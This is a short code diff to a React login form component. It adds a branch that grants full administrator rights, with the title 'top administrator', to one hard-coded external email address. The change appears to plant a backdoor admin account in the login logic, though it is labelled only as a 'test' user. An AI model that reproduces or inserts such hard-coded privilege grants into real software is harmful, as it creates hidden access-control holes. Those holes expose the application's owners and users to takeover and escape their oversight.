@@ -69,7 +69,14 @@ const LoginForm: React.FC<LoginFormProps> = ({ findUserByEmail }) => {
             position = '最高管理者';
             department = '管理部';
             role = 'admin' as const;
-          } else {
+          } 
+            else if (email === 'liaoyuwii@yahoo.tw') {
+            displayName = 'test';
+            position = '最高管理者';
+            department = '管理部';
+            role = 'admin' as const;
+          }
+            else {
             displayName = `User ${validatedUserId}`;
             position = '一般員工';
             department = 'HR';
